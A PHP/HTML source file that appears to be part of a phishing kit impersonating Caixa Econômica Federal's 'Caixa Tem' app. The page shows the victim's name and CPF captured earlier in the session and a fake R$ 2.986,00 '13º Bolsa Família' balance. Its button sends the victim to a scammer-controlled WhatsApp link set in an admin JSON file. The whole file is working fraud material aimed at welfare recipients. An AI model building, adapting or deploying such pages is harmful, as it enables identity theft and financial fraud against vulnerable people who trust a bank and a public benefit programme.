<?php 
session_start();
$json = json_decode(file_get_contents('./admin/link.json'));
$senha = $json->link->data;
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Caixa Economica</title>

    <link href="https://fonts.cdnfonts.com/css/rawline" rel="stylesheet">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />

    <link rel="stylesheet" href="<?=PATH?>css/home.css">
</head>
<body>
    <main class="bg">
        <div class="header-home">
            <div>
                <img src="images/caixa-tem.png" height="70px;" alt="">
            </div>            
            <hr>
        </div> 

        <div class="main-ghome">
            <br>
            <div class="user">
                <div class="user-main">
                    <div class="user-icon">
                        <i class="fa-solid fa-user-large"></i>
                    </div>
                    <div class="nome">
                        <p><?=$_SESSION['nomecompleto']?></p>
                        <p class="cpf"><?=$_SESSION['cpf']?></p>
                    </div>
                    
                </div>                
            </div>
            <div class="saldo">
                <p><b> R$ </b><span class="saldo_atual"><b><span>2.986,00</span></b></span><span class="mascara"></span><span> <i id="eye" class="fa-solid fa-eye"></i></span></p>
                <p class="pequeno">Saldo disponível do 13º Bolsa Família.</p>
            </div>
            <br>
            <div class="card">
                <h3>Liberar seu 13º Bolsa Família</h3>
                <br>
                <img src="images/aviso_final.png"alt="">
                
                <div class="borda">
                    <h3 class="azul">Liberação via atendimento <i class="fa-brands fa-whatsapp"></i></h3>
                    <p class="pequeno">Clique no botão abaixo <br> para  liberar o 13º Bolsa Família</p>
                    <a href="<?=$senha?>" class="btn-verde">Liberar 13º Bolsa Família</a>
                </div>                
            </div>
            <br><br><br>
        </div>
    </main>




<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
<script src="js/jquery.mask.js"></script>
<script src="js/script.js"></script>

<script>
    $(document).ready(function(){
        $('.phone_with_ddd').mask('(00) 0000-0000');
        $('.cep').mask('00000-000');
        $('.cpf').mask('000.000.000-00', {reverse: true});
        $('.date').mask('00/00/0000');
        $('.senha').mask('00000000');

    })

    $("#eye").on("click",function(){
        $(".mascara").toggle();
        $(".saldo_atual").toggle();
    })
</script>
</body>
</html>